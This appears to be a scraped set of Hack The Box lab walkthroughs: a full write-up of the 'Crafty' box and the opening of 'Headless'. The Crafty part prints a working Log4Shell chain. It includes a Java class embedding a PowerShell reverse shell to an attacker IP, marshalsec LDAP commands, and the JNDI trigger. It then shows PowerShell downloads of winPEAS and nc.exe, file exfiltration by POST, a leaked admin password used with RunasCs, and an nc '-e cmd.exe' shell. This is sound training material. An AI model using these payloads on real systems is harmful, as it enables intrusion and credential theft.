WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,aspx,html -timeout 4 -v Directory enumeration against http://crafty.htb/ gave the following:
Exploring the Website The index page doesn&rsquo;t hold any surprises. /home and . both redirect here. All three buttons link to /coming-soon. The website doesn&rsquo;t appear to have any interactible content.
Port 25565 - Minecraft According to the nmap service version scans, the target is running Minecraft 1.16.5. Interestingly, a quick check reveals that this version is wildly out-of-date, from 2021. The latest Java Edition Minecraft is 1.20.2.
Version 1.16.5 was the last version that uses Java 8. We&rsquo;ll see if that&rsquo;s relevant.
&#x1f514; Wait a second&hellip; Java&hellip;? 2021&hellip;? Is this about exploiting log4j? It&rsquo;s worth checking, that&rsquo;s for sure!
I already knew that people exploited log4j to attack Minecraft servers; it was a big deal that year. What I didn&rsquo;t realize was how easy it was to actually pull off this exploit. Check out this video for a quick demonstration.
In this video, they utilize a malicious LDAP server using this repo and force the vulnerable minecraft server to make a request to the LDAP server, loading in a java class that contains the payload.
I shouldn&rsquo;t get too excited. According to this official message, it&rsquo;s possible to patch the vulnerability without upgrading the server:
1.12-1.16.5: Download this file to the working directory where your server runs. Then add the following JVM arguments to your startup command line: -Dlog4j.configurationFile=log4j2_112-116.xml
Java SE 8 To set up the malicious LDAP server (or RMI, it doesn&rsquo;t matter) shown in that repo, we first need to install Java 8. You can get the official one from here, but it requires making a login.
&#x1f440; I always find dealing with java to be such a pain.
Note that my current java version is 17.0.10:
Download the java version. I already had one sitting around, jdk1.8.0_381 as a tarball in my Downloads directory. Next we install it so that update-alternatives can access it:
cd /usr/lib/jvm tar -zxvf ~/Downloads/jdk-8u381-linux-x64.tar.gz sudo update-alternatives --install &#34;/usr/bin/java&#34; &#34;java&#34; &#34;/usr/lib/jvm/jdk1.8.0_381/bin/java&#34; 0 sudo update-alternatives --install &#34;/usr/bin/javac&#34; &#34;javac&#34; &#34;/usr/lib/jvm/jdk1.8.0_381/bin/javac&#34; 0 Now that we&rsquo;re done with that, we can change java versions more easily:
sudo update-alternatives --config java Select the version of java that we need. In this case, option 3:
Also do the same for javac
Now we can verify that we&rsquo;re using the right version:
&#x261d;&#xfe0f; You can also simply mask the java version by setting the JAVA_HOME environment variable, then putting that version of java on your PATH. That&rsquo;s what I&rsquo;ve done in the past, but this is easier. For an example of that method, check out this section of my RegistryTwo walkthrough.
FOOTHOLD The whole plan for gaining a foothold might be a little confusing. I&rsquo;ll be tackling each step in separate sections, but here&rsquo;s the overall plan:
p a S y e l ┌ │ │ │ └ r o ┌ │ │ │ └ ┌ │ │ │ └ ─ ─ v a ─ ─ ─ ─ ─ ─ e d ─ ─ ─ ─ ─ ┬ │ │ ┴ : : : ┬ │ │ └ ─ ─ ─ ─ ─ ─ ─ ─ ─ A ─ ─ ─ ─ ─ ─ ─ ─ T ─ ─ H S ( ─ ─ L S ( ─ ─ ─ M C ─ T ─ ─ T e P ─ ─ D e M ─ ─ ─ i l ─ A ─ ─ T r y ─ ─ A r a ─ ─ ─ n i ─ C ─ ─ P v t ─ ─ P v r ─ D ─ ─ e e ─ K ─ ─ e h ─ ─ e s ─ e ─ ─ c n ─ E ─ ─ r o ─ ─ r h ─ l ─ ─ r t ─ R ─ ─ n ─ ▲ │ ┴ a ─ i ─ ─ a ─ ─ ) ─ R ─ l ─ v ─ ─ f ─ ─ ─ e ─ s ─ e ─ ─ t ─ ─ ─ f ─ e ─ r ─ ─ ─ ─ ─ e ─ c ─ ─ ─ ─ ─ ─ r ─ ) ─ m ─ ─ ─ ┐ │ │ │ ┘ ┐ │ │ │ ┘ a ─ ┐ │ ├ │ ┘ t ◄ l ─ ─ o ─ i ─ ─ ─ c ─ ─ h ─ i ─ ─ t ─ o ─ ─ t ─ u ─ I ─ p ─ s ─ n ─ ─ ─ j ─ ─ c ─ e ─ ─ f o ─ c ─ ─ r d ─ t ─ R ─ o e ─ ─ e ─ m ─ J ─ q ─ p ─ N ─ u ─ r a ─ D ─ e ─ e y ─ I ─ s ─ m l ─ ─ t ─ o o ─ C ─ ─ t a ─ o ─ c ─ e d ─ d ─ o ─ ─ e ─ d ─ L ─ ─ e ─ D ─ ─ ─ A ─ ─ ─ P ─ ─ ─ ► ► ┌ │ │ │ │ │ │ │ │ ┼ │ │ │ │ │ │ │ │ │ │ └ ─ ─ ─ ─ M S ─ T w s ─ ─ i e ─ e r e ─ ─ n r ─ x i r ─ T ─ ─ e v ─ t t v ─ A ─ ─ c e ─ t e ─ R ─ ─ r r ─ c e r ─ G ─ ─ a ─ h n ─ E ─ ─ f ┐ │ │ │ │ │ │ │ a l ─ T ─ ─ t t t o ─ ─ o g ─ ─ s ─ ─ ─ ─ ─ ┐ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ┘ Getting Minecraft &#x26a0;&#xfe0f; Reader! Please note there is a much better way to do this than getting the Minecraft client. At the end of this walkthrough, after going through this exploit using the Minecraft client, I explore how to do gain a foothold without needing to download or install the game.
Please refer to the section Exploiting without minecraft if that&rsquo;s something that interests you. I highly recommend it!
I&rsquo;m using TLauncher to get exactly the minecraft client version I need. Frankly, this application is making my skin crawl. I don&rsquo;t recommend it &#x1f637;
My opinion? Go find something better than TLauncher. This launcher is really polluting my system. I&rsquo;m going to have some cleanup work to do after this box&#x1f926;&zwj;&#x2642;&#xfe0f;
Be sure to choose the unmodded (Release) version. Click Install to download the appropriate minecraft client (I hope). It will install into ~/.minecraft, and the launcher itself is in ~/.tlauncher.
After downloading, I can run the game. I&rsquo;ll connect to the target server:
It seems to run alright for a few minutes, then crashes: no worries though - it won&rsquo;t take that long to deploy the payload.
Writing the payload For the payload, we&rsquo;ll need to define a java class to gain RCE. For this, the easiest way is to define a class with a single static initializer block, that utilizes getRuntime().exec(). This way, the code will be executed as soon as the class is imported. Remember that the .java file must be named the same as the class:
public class Payload { static { try { String cmd = &#34;powershell -nop -c \\&#34;$client = New-Object System.Net.Sockets.TCPClient(\\&#39;10.10.14.7\\&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + \\&#39;PS \\&#39; + (pwd).Path + \\&#39;&gt; \\&#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\&#34;&#34;; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch (Exception e) { System.out.println(&#34;An error occurred while deploying payload:\\n&#34;); e.printStackTrace(); } } } &#x261d;&#xfe0f; For the cmd variable above, I used https://www.revshells.com/ to generate the Powershell #2 reverse shell, specifying my current tun0 IP and port 4444. It&rsquo;s completely unobfuscated and sent as plaintext.
Since this is all going into a java String variable, all of the double-quotes and single-quotes will need to be escaped with a backslash \\.
Then compile the payload. Remember, it must be compiled using Java 8:
Note: I initially tried this all using a base64 encoded Powershell reverse shell. Turns out that wasn&rsquo;t necessary, and didn&rsquo;t work. The above reverse shell works fine though.
Serving the payload I&rsquo;ll use a Python http.server to serve the payload. The LDAP server from marshalsec will reference this server when contacted by the target. Then, this http.server will serve our malicious java class to the target. From there, the target will include the code, which should run the static initializer code and trigger a reverse shell.
sudo ufw allow from $RADDR to any port 8000 proto tcp cd exploit/payload # Directory that contains Payload.class python3 -m http.server 8000 Setting up marshalsec The marshalsec git repo that I mentioned earlier is used for a few different deserialization attacks. For those that want to learn in detail how it works, the repo has a paper explaining it all.
&#x1f44d; The repo also mentions that Java 8 is required, but we&rsquo;ve already taken care of that.
First, we&rsquo;ll build it using maven:
mvn clean package -DskipTests The feature I&rsquo;ll need to use is JNDI reference indirection. Basically, we&rsquo;ll get marshalsec to host a malicious LDAP server that, when called upon, will refer to an http server that we&rsquo;re hosting on the target machine. We&rsquo;ll be hosting a malicious java class from the http server. It should work like this:
Next, we&rsquo;ll run marshalsec JNDI reference indirection and point it at an http server running locally. (PHP, Python, or anything else would be fine, but I&rsquo;ll be using a python http.server):
sudo ufw allow from $RADDR to any port 1389 proto tcp java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#34;http://10.10.14.7:8000/#Payload&#34; The JNDI call that arrives here will basically tell the target Minecraft server &ldquo;hey, look for the Payload class over here, and include that remote code into the classpath&rdquo;.
Reverse shell Next, I&rsquo;ll open up a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash rlwrap socat -d TCP-LISTEN:4444 STDOUT Finally, all of the pieces are in place. We can verify with netstat -tulpn can see they are listening and ready:
We should be able to trigger this whole thing by logging into the Minecraft server, then saying this in the chat:
\${jndi:ldap://10.10.14.7:1389/Payload} Trying it out Alright, I&rsquo;ll try logging onto the target&rsquo;s Minecraft server and saying the JNDI command. I took a gif of achieving the reverse shell, but the LDAP server and HTTP server were contacted in a terminal not visible in the gif:
First, we see the LDAP server get contacted by the target:
Then the HTTP server gets a request for the Payload.class:
Here&rsquo;s how I did it in the game (press T to chat):
Indeed, we now have a Powershell reverse shell running as svc_minecraft:
USER FLAG The user flag is sitting on the Desktop folder for svc_minecraft. Go get it!
cd C:\\Users\\svc_minecraft\\Desktop cat user.txt SSH &#x1f6ab; The target isn&rsquo;t running SSH - don&rsquo;t bother with this. I&rsquo;m keeping this process here just for my own reference on future boxes, but it&rsquo;s definitely not useful for Crafty!
Now that I got a foothold, I&rsquo;d like to do an SSH connection instead. I&rsquo;ll generate a key and try to plant it on the target:
ssh-keygen -t rsa -b 4096 # Used passphrase st4rling base64 -w 0 id_rsa.pub | tee id_rsa.pub64 # copy the base64 public key to clipboard chmod 700 id_rsa On the target, we&rsquo;ll use powershell to decode the key and place it:
cd C:\\Users\\svc_minecraft New-Item -ItemType Directory -Force .ssh cd .ssh # Paste the base64 public key $b64 = &#34;c3NoLXJz...GthbGkK&#34; # Decode the base64 key $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) $decodedText | Out-File -FilePath &#34;authorized_keys&#34; -Encoding utf8 Then we log in using the private key:
ssh -i ./id_rsa svc_minecraft@$RADDR &#x1f61e; Unfortunately though, this didn&rsquo;t seem to work. SSH just times out.
&#x1f926;&zwj;&#x2642;&#xfe0f; Edit: DUH! For some reason, I thought the target was running SSH? I just rechecked my port scan, and it definitely is not. Woops!
ROOT FLAG User enumeration I&rsquo;m still not very skilled with Windows, so I&rsquo;m going to go straight to running winPEAS to look for a way to escalate. Normally, I&rsquo;d transfer winPEAS using wget or curl, but it seems that the target doesn&rsquo;t have either of those. Instead, let&rsquo;s just use powershell:
(New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.7:8000/winPEASany.exe&#39;, &#39;C:\\users\\svc_minecraft\\Desktop\\winPEAS.exe&#39;) .\\winPEAS.exe WinPEAS found a list of users, although just running net users would have done the same:
However, winPEAS also showed that there have been 0 logins for jacob. Additionally, jacob does not have a directory in C:\\Users - so I think it&rsquo;s fair to say we won&rsquo;t need to privesc to that user. In short, we only need to care about Administrator and svc_minecraft.
WinPEAS also seems to have found a hash for svc_minecraft:
???????????? Enumerating Security Packages Credentials Version: NetNTLMv2 Hash: svc_minecraft::CRAFTY:1122334455667788:c3b03e710cbcd66c30d43a49dffcaba3:01010000000000004bac97c87286da0135d0d230f8fbba4f0000000008003000300000000000000000000000002000004f18521d80ec0b053dce8cd5cf17f3359cca6435314f2d4862b085bf4a92a0c60a00100000000000000000000000000000000000090000000000000000000000 Next, I took a look around the filesystem. I found a plugin for the minecraft server, 'C:\\users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar.
That&rsquo;s notable mostly because we know the server was running without mods&hellip; &#x1f914;
playercounter I tried a few different methods to attempt to upload it to my machine so that I could examine the file, but didn&rsquo;t have much success:
Impacket SMB server; drive mapping and copy to mapped drive Impacket SMB server; upload to remote directory Python uploadserver Ultimately, I had to resort to using one of my own tools (one that&rsquo;s kinda poorly-written), that I made to act a lot like python&rsquo;s uploadserver module. Basically, it&rsquo;s an extension of http.server that also handles POST requests and will output all received data to stdout. That way, you can just POST base64-encoded data at it:
git clone https://github.com/4wayhandshake/simple-http-server.git cd simple-http-server ./SimpleServer.py 8000 Now, from the target, we can base64-encode the file and upload it using a POST request:
$b64 = [System.convert]::ToBase64String((Get-Content -Path &#39;C:\\users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar&#39; -Encoding Byte)) Invoke-WebRequest -Uri http://10.10.14.7:8000 -Method POST -Body $b64 Then on the attacker, we need to base64-decode the data and put it into a file:
echo &#39;UvcG9tLnByb3BlcnRpZXNQSw...UGAAAAABkAGQBxBwAAhR8AAAAA&#39; | base64 -d &gt; playercounter.jar Wondering if it held anything interesting, I checked strings on it. Nothing too interesting, just a mention of a java class (Playercounter.class). Curious about the class, I opened the file up in jd-gui (java decompiler) and examined the class. This is what I found:
package htb.crafty.playercounter; import java.io.IOException; import java.io.PrintWriter; import net.kronos.rkon.core.Rcon; import net.kronos.rkon.core.ex.AuthenticationException; import org.bukkit.plugin.java.JavaPlugin; public final class Playercounter extends JavaPlugin { public void onEnable() { Rcon rcon = null; try { rcon = new Rcon(&#34;127.0.0.1&#34;, 27015, &#34;s67u84zKq8IXw&#34;.getBytes()); } catch (IOException e) { throw new RuntimeException(e); } catch (AuthenticationException e2) { throw new RuntimeException(e2); } String result = null; try { result = rcon.command(&#34;players online count&#34;); PrintWriter writer = new PrintWriter(&#34;C:\\\\inetpub\\\\wwwroot\\\\playercount.txt&#34;, &#34;UTF-8&#34;); writer.println(result); } catch (IOException e3) { throw new RuntimeException(e3); } } public void onDisable() {} } Ah, I get it. This is the thing that produces that little widget we saw on the /home page:
But wait&hellip; is this line some kind of connection string to a local service on port 27015? Perhaps string is a credential? I&rsquo;ll look into it next &#x1f6a9;
rcon = new Rcon(&#34;127.0.0.1&#34;, 27015, &#34;s67u84zKq8IXw&#34;.getBytes()); Also, we see that it&rsquo;s writing a file to C:\\inetpub. Is that a protected folder? You&rsquo;d think the svc_minecraft and webserver service account would be separate. If this plugin is running with elevated permissions, it should be simple enough to swap it out for something that opens another shell. I&rsquo;ll have to look into this as well &#x1f6a9;
Mysterious credential As I concluded earlier in the user enumeration section, the only two users on this machine that I need to care about are Administrator and svc_minecraft. Hopefully, s67u84zKq8IXw is the password for Administrator.
But even then, how does one change between users in Windows? It&rsquo;s not like you can simply su -u like you might in Linux. There are a few ways&hellip;
Powershell only Theres a way using only powershell:
$username = &#34;Administrator&#34; $password = ConvertTo-SecureString &#34;s67u84zKq8IXw&#34; -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential($username, $password) Start-Process -Credential $credential -FilePath &#34;whoami.exe&#34; I didn&rsquo;t get any result from doing that.
Runas There&rsquo;s also a way usin runas, which should prompt for a password when it runs:
runas /user:Administrator /noprofile /savecred cmd &#x261d;&#xfe0f; This is roughly equivalent to su -u [username] /bin/bash
The disadvantage with this is that you can&rsquo;t provide a password to this call directly. In other words, you need an interactive prompt to use runas.
One way to get around this is by building on what we did in the &ldquo;Powershell only&rdquo; way:
$username = &#34;Administrator&#34; $password = ConvertTo-SecureString &#34;s67u84zKq8IXw&#34; -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential($username, $password) Start-Process -Credential $credential -FilePath &#34;runas&#34; -ArgumentList &#34;/user:$username &#39;whoami.exe&#39;&#34; However, this didn&rsquo;t do anything either! Neither did this:
Start-Process -Credential $credential -FilePath &#34;runas&#34; -ArgumentList &#34;/user:$username /noprofile /savecred &#39;whoami.exe&#39;&#34; RunasCs There&rsquo;s a handy tool written as a drop-in replacement for runas but with extra functionality. It&rsquo;s a lot more useful if you&rsquo;re working out of a &ldquo;dumb&rdquo; shell. Check out the git repo for more detail. It allows the user to supply both the username and password as arguments.
Although this distinction sounds minor, it should allow us to overcome the limitations of this reverse shell!
First, let&rsquo;s serve this tool to the target:
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip unzip RunasCs.zip python3 -m http.server 8000 Now, I&rsquo;ll download the tool to the target:
# Download RunasCs $file = &#39;C:\\users\\svc_minecraft\\Downloads\\RunasCs.exe&#39; (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.7:8000/RunasCs.exe&#39;, $file) # Try RunasCs .\\RunasCs.exe Administrator s67u84zKq8IXw &#34;cmd /c whoami&#34; Nice! it worked! As it turns out, that &ldquo;s67u84zKq8IXw&rdquo; thing was indeed the password for Administrator:
Let&rsquo;s see if we can get a reverse shell out of it. I tried using a powershell reverse shell - didn&rsquo;t work. Let&rsquo;s try a netcat one instead. Also, nc isn&rsquo;t on the target machine, so let&rsquo;s download a copy:
$file = &#39;C:\\users\\svc_minecraft\\Downloads\\nc.exe&#39; (New-Object Net.WebClient).DownloadFile(&#39;http://10.10.14.7:8001/windows-binaries/nc.exe&#39;, $file) Next, as shown in the RunasCs github repo, I&rsquo;ll make a nc reverse shell and background it by using the -t 0 option:
$nc = &#34;C:\\users\\svc_minecraft\\Downloads\\nc.exe&#34; .\\RunasCs.exe Administrator s67u84zKq8IXw &#34;$nc 10.10.14.7 4445 -e cmd.exe&#34; -t 0 Alright! Success! &#x1f601;
Finally we have a root shell. Just type out the flag for those glorious root flag points &#x1f4b0;
type root.txt &#x26a0;&#xfe0f; Remember to reset your java and javac versions to their defaults, if you haven&rsquo;t already done so:
# Select the entries marked &#39;auto&#39; sudo update-alternatives --config java sudo update-alternatives --config javac EXTRA CREDIT Exploiting without Minecraft To exploit the vulnerability in log4j, we simply need to find a way to inject JNDI code into the log file. So we should be asking, do we really need to use a minecraft client for this? I would have loved to avoid getting TLauncher and downloading the game.
There&rsquo;s a python package that looks like it does exactly this, called pyCraft. It looks like it has some requirements, so let&rsquo;s set up a venv and try this out:
mkdir headless; cd headless git clone https://github.com/ammaraskar/pyCraft.git python3 -m venv . source bin/activate pip3 install requests cryptography pynbt It comes with a pre-written example script, start,py:
Note that, even though we&rsquo;re connecting to a multiplayer server, we&rsquo;re in the offline use-case because we&rsquo;re not trying to authenticate with authentication.mojang.com. Hence, run it by providing a blank password:
python3 start.py -u 4wayhandshake -p &#39;&#39; -s 10.10.11.249 It replies stating that was connected successfully. If you check out start.py, you&rsquo;ll see that any input other than /respawn becomes a chat message. So we can exploit the target by issuing a single chat command:
Right away, I saw the exploit go through the LDAP server and the webserver:
Then I had a reverse shell!
&#x1f601; That was way easier and cleaner that using a Minecraft launcher and downloading the game.
LESSONS LEARNED Attacker &#x231b; When you&rsquo;re dealing with Windows, sometimes it just takes a few tries. When I was doing privilege escalation to Administrator, I wasn&rsquo;t even certain that I a password, much less the correct password. Thankfully, I only had to keep trying four times before I had positive confirmation that I had the correct password. The important part is that I didn&rsquo;t give up right away - even though the alternatives I tried seemed nearly identical. &#x1f921; Keep RunasCs in mind for privilege escalation. This tool seems really useful, especially for the (fairly common) case when we&rsquo;re trying to escalate using a non-interactive &ldquo;dumb&rdquo; shell. Defender &#x260e;&#xfe0f; Disable remote code. I still can barely understand why Java has mechanisms for introducing remote code into a program. I&rsquo;ve gone on this rant before, but why do things like RMI even exist? Do yourself a favor and disable this functionality. You can do this by providing flags to the java runtime itself.
&#x1f440; The administrator left code inside the user directory of svc_minecraft that could easily be read. Although the action that this code performed was indeed safe, there were hardcoded credentials left inside. That&rsquo;s a big problem. A way to prevent this is through access control lists (ACLs) and moving the credential into a secure location (not readible by svc_minecraft). The administrator could grant execute permissions to svc_minecraft for the plugin, but deny them read access to the credential file, by defining ACL rules with System.Security.AccessControl.FileSystemAccessRule.
&#x261d;&#xfe0f; Keep your software updated. Updating quickly would keep the server from being vulnerable for too long. The average developer didn&rsquo;t see log4shell coming. The best they could have done is react quickly to it, and patch things as fast as possible.
&#x1f4b0; Fund open source. Sadly, it&rsquo;s not rare for widespread essential packages like log4j to be under-funded and in poor health. While many developers didn&rsquo;t see log4shell coming, the log4j developers flagged the issue over a year before it became well-known. However, due to limited capacity and budget constraints, they couldnt fix it. So many people and companies keep demanding more and more from open source, but providing nothing. It&rsquo;s unjust. You want something done? Contribute.
`,url:"https://4wayhandshake.github.io/walkthrough/crafty/"},"https://4wayhandshake.github.io/walkthrough/headless/":{title:"Headless",tags:["XSS","Command Injection","Insecure Permissions","SUID Bash"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION The penultimate box of HTB&rsquo;s Season IV Savage Lands, released for week 12, is Headless. While I haven&rsquo;t really been participating in the season, this is one of the few boxes that I attempted within the 1 week limit. It was totally worth it! This box is an absolute delight, and I can&rsquo;t recommend it enough. There aren&rsquo;t any rabbit-holes on this one, and most of the effort will simply be to gain a foothold. It&rsquo;s a quick box that reinforces some good hacking fundamentals.
Gaining a foothold on this box requires a little bit of out-of-the-box thinking. Putting yourself in the seat of an actual attacker, you&rsquo;ll find a portion of the website that can be abused to gain a foothold via cross-site scripting. The really fun thing is that the box created scripted up an automated &ldquo;administrator&rdquo; that acts as a human might - so you can finally try some XSS on an HTB target! After finding a way into an admin dashboard, some easy command injection will grant you access.
The user flag is available on initial access to the target. At this point, be sure to open up an SSH connection, or you might miss something important! That being said, even if you miss this important thing, some simple enumeration of the user will point you in the right direction. Privesc to root is apparent after just a little bit of code reading. Exploiting the privesc vulnerability is trivial once the vulnerability is identified. Best of luck on this one!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp Oh, interesting! Only SSH and UPnP&hellip; It truly is headless &#x1f600; That being said, nmap often flags whatever it finds on port 5000 as UPnP
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA) |_ 256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.2.2 Python/3.11.2 | Date: Sat, 23 Mar 2024 21:01:25 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 2799 | Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/ | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Under Construction&lt;/title&gt; | &lt;style&gt; | body { | font-family: &#39;Arial&#39;, sans-serif; | background-color: #f7f7f7; | margin: 0; | padding: 0; | display: flex; | justify-content: center; | align-items: center; | height: 100vh; | .container { | text-align: center; | background-color: #fff; | border-radius: 10px; | box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2); | RTSPRequest: | &lt;!DOCTYPE HTML&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;utf-8&#34;&gt; | &lt;title&gt;Error response&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;h1&gt;Error response&lt;/h1&gt; | &lt;p&gt;Error code: 400&lt;/p&gt; | &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt; | &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt; | &lt;/body&gt; |_ &lt;/html&gt; However, the data that we got from the default scripts scan of the UPnP port 5000 appears to be HTML. I might try connecting to it with nc or even requesting http from it. I can see that it is using Python 3.11.2 and Werkzeug 2.2.2, so it&rsquo;s clearly an http server (I&rsquo;m fairly certain that&rsquo;s all that Werkzeug is for).
That Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs header also seems interesting.
While the rest of my nmap scans were running, I tried connecting to that port using http, and got a website:
I also took a quick look at the page source code: it looks completely secure. The only thing of note is the link to the /support page.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
Not shown: 86 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 19/udp open|filtered tcpwrapped 68/udp open|filtered tcpwrapped 88/udp open|filtered kerberos-sec 111/udp open|filtered rpcbind 120/udp open|filtered tcpwrapped 135/udp open|filtered msrpc 520/udp open|filtered route 631/udp open|filtered tcpwrapped 1023/udp open|filtered tcpwrapped 1025/udp open|filtered blackjack 1701/udp open|filtered L2TP 2223/udp open|filtered tcpwrapped 5353/udp open|filtered zeroconf 49201/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=headless.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR I&rsquo;m quite curious about that cookie. It looks like base64 - let&rsquo;s decode it:
Ok, so the first part decodes to &ldquo;user&rdquo;. I&rsquo;ll try assuming the . is a separator between a key and a variable, and just decode everything after the .:
Hmm, nope.
I&rsquo;ll move on to directory enumeration on http://headless.htb:5000:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e js,html -timeout 4 -v Directory enumeration against http://[domain].htb/ gave the following:
However, when including the provided cookie, that 500 status for /dashboard changes to a 401 Unauthorized. Maybe all I need to do is brute-force the cookie? I&rsquo;ll come back to this approach later &#x1f6a9;
The cookie clearly encodes a username. Perhaps I just need to put a username for an admin in there?
To check what other methods might be available for dashboard, I fuzzed the http verb:
WLIST=/usr/share/seclists/Fuzzing/http-request-methods.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/dashboard -t 80 -c -o ffuf-directories-root -of json -e js,html -timeout 4 -v -b &#39;is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs&#39; -X FUZZ -fc 405 Ok, that&rsquo;s not too surprising.
Exploring the Website After clicking the For Questions button from the index page, I was brought to the /support page, where there is a short form. Checking out the source code, it looks like the form actually does something; it POSTs to /support:
But when I Submit that form, nothing really happens. Interestingly, when I submit the form with the same contents, except with suffizing the message with a hundred or so copies of &lt;&gt;?!@#$%^&amp;*(){}, I get something new:
&#x1f602; I wonder what part of that it didn&rsquo;t like. I tried decomposing it a little bit, and it seems that the part flagging me as &ldquo;hacking&rdquo; driven by a regex that denies matching pairs of angle brackets &lt;...&gt; or double curly braces {{...}}.
But maybe I can use this. &ldquo;User-controllable values being reflected to the page&rdquo;? That makes me think of XSS and SSTI. Let&rsquo;s explore those next &#x1f6a9; But first, I&rsquo;ll quickly check for sql injection.
FOOTHOLD SQL Injection &#x1f6ab; This is not the correct path. Skip to the next section if you&rsquo;re short on time.
Just to &ldquo;check all the boxes&rdquo;, let&rsquo;s test this form for an SQL injection. I filled out the Contact Support form as shown above and proxied the form submission through Burp. Then, I saved the request to support.req:
Now I&rsquo;ll hand that request to sqlmap and let it do it&rsquo;s thing:
sqlmap -r support.req --batch SSTI The initial reaction may be to seek some kind of bypass for the &ldquo;Hacking Attempt Detected&rdquo; check. That would entail figuring out a way to bypass whatever regex of WAF is blocking the angle brackets &lt;...&gt; or double curly braces {{...}}.
But actually, we don&rsquo;t want to bypass it at all! The user-controlled parameters are reflected to the page when we get caught. So actually, I should intentionally have my hacking attempts detected, but sneak a payload into a user-controlled parameter &#x1f642;
I&rsquo;ll try planting all kinds of SSTIs inside the cookie:
WLIST=/usr/share/seclists/Fuzzing/template-engines-expression.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/support \\ -d &#39;fname=Jim&amp;lname=Bob&amp;email=jimbob%40fake.htb&amp;phone=789-555-0123&amp;message=This+is+my+message&lt;&gt;&#39; \\ -X POST -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -b &#39;is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_ZfsFUZZ&#39; \\ -t 80 -c -timeout 4 -v -mr &#39;fs1764&#39; No results from that. I also tried manually, assuming that Jinja2 is in use - just to see if any parameters other than the cookie might be vulnerable:
No result from that, or any tests similar to the above request.
